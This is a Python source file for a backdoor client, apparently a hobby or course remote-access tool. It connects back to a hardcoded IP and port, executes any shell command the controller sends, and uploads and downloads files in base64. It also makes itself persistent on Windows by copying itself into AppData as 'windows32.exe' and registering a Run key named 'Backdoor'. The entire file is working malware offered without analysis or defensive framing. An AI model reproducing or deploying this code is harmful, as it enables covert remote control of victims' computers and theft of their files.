#!/usr/bin/python3
import socket
# from termcolor import colored
import subprocess
import json
import sys
import os
import base64
import shutil
import time

HOST = '192.168.0.94'
PORT = 54321


def reliable_send(_s, _data):
    json_data = json.dumps(_data.decode('UTF-8'))
    _s.sendall(json_data.encode('UTF-8'))


def reliable_recv(_s):
    data = ""
    while True:
        try:
            data = data + (_s.recv(1024)).decode('UTF-8')
            print(data)
            return json.loads(data)
        except ValueError:
            continue


def connection(_s):
    while True:
        time.sleep(20)
        try:
            _s.connect((HOST, PORT))
            break
        except:
            continue


def shell(_s):
    while True:
        cmd = reliable_recv(_s)
        if cmd == 'q':
            print('[-] Instruction to close sent from the server')
            # print(colored('[-] Instruction to close sent from the server', 'red'))
            _s.close()
            exit(1)
            break
        elif cmd[:2] == 'cd' and len(cmd[3:]) > 1:
            try:
                os.chdir(cmd[3:])
            except:
                continue
        elif cmd[:4] == 'send' and len(cmd[5:]) > 1:
            with open(cmd[5:], 'wb') as f:
                file_data = reliable_recv(_s)
                f.write(base64.b64decode(file_data))
                f.close()
        elif cmd[:3] == 'get' and len(cmd[4:]) > 1:
            try:
                with open(cmd[4:], 'rb') as f:
                    file_data = f.read()
                    reliable_send(_s, base64.b64encode(file_data))
            except:
                failed = 'Failed to Upload'
                reliable_send(_s, base64.b64encode(failed))
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(_s, result)


def client():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        connection(s)
        with s:
            shell(s)


def persistence():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "' +
                        location + '"', shell=True)


persistence()
client()
